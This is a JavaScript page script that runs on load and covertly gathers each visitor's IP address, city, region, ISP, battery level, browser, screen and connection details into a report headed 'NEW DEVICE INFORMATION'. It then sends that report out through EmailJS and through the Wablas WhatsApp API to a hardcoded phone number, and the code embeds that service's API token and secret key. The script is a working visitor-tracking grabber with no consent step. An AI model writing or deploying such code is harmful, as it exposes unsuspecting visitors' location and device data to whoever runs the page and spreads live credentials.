const infoBox = document.getElementById('info');

async function getIPInfo() {
  try {
    const res = await fetch('https://ipapi.co/json/');
    const data = await res.json();
    return data;
  } catch (err) {
    return { error: 'IP info failed' };
  }
}

async function getBatteryInfo() {
  if ('getBattery' in navigator) {
    try {
      const battery = await navigator.getBattery();
      return {
        level: (battery.level * 100).toFixed(2) + '%',
        charging: battery.charging ? 'Charging' : 'Not Charging'
      };
    } catch {
      return { level: 'N/A', charging: 'N/A' };
    }
  } else {
    return { level: 'N/A', charging: 'N/A' };
  }
}

async function getDeviceInfo() {
  const ip = await getIPInfo();
  const battery = await getBatteryInfo();
  const deviceMemory = navigator.deviceMemory || 'N/A';
  const connection = navigator.connection || {};
  const connectionType = connection.effectiveType || 'unknown';
  const now = new Date();
  const localTime = now.toLocaleString('id-ID', { day: '2-digit', month: 'long', year: 'numeric', hour: '2-digit', minute: '2-digit' });

  const output = 
`NEW DEVICE INFORMATION

real name: [N/A]
number: [N/A]
IP Information:
IP Address: ${ip.ip || 'N/A'}
City: ${ip.city || 'N/A'}
Region: ${ip.region || 'N/A'}
Country: ${ip.country || 'N/A'}
ISP: ${ip.org || 'N/A'}
Time Zone: ${ip.timezone || 'N/A'}
Current Time: ${localTime}

Device Information:
Battery Percentage: ${battery.level}
Charging Status: ${battery.charging}
Browser Version: ${navigator.userAgent}
Device Model: ${navigator.vendor || 'N/A'}
Device Type: ${/Mobile|Android/.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}
Screen Resolution: Width: ${screen.width}px, Height: ${screen.height}px
Screen Orientation: ${screen.orientation?.type || 'N/A'}
Memory: ${deviceMemory} GB
Touch Support: ${'ontouchstart' in window ? 'Supported' : 'Not Supported'}
Connection Type: ${connectionType}

Information Captured By: always ixiz
  `;
  infoBox.textContent = output;
  sendEmail({
    title: "NEW DEVICE INFORMATION",
    name: "febri",
    email: "no-reply@yourdomain.com",
    time: localTime,
    message: output
  });
  sendToWhatsApp(output);
}

// Send email via EmailJS
function sendEmail(params) {
  emailjs.init("_4uxmL_LKg0djw_Lw"); // PUBLIC KEY

  // Hanya kirim variable yang ada di template EmailJS
  const templateParams = {
    name: params.name,
    time: params.time,
    message: params.message
  };

  emailjs.send('service_ee1jmqd', 'template_xgutrmc', templateParams)
    .then(function(response) {
       console.log('SUCCESS!', response.status, response.text);
    }, function(error) {
       console.log('FAILED...', error);
    });
}

// Send to WhatsApp via Wablas API
function sendToWhatsApp(message) {
  const token = "ntxKnqLw09lHhsSXG75taXY0YR9gTOFIvtsP9FPmXFomxdrcj7tHDqU";
  const phone = "6285711245231";
  const secretKey = "OMP51JAH";

  // Sesuai dokumentasi Wablas v2, parameter harus array pada key 'data'
  fetch("https://texas.wablas.com/api/v2/send-message", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": token
    },
    body: JSON.stringify({
      data: [
        {
          phone: phone,
          message: message,
          secret: true,
          secret_key: secretKey
        }
      ]
    })
  })
  .then(response => response.json())
  .then(data => console.log("WhatsApp message sent:", data))
  .catch(err => console.error("Error:", err));
}

getDeviceInfo();
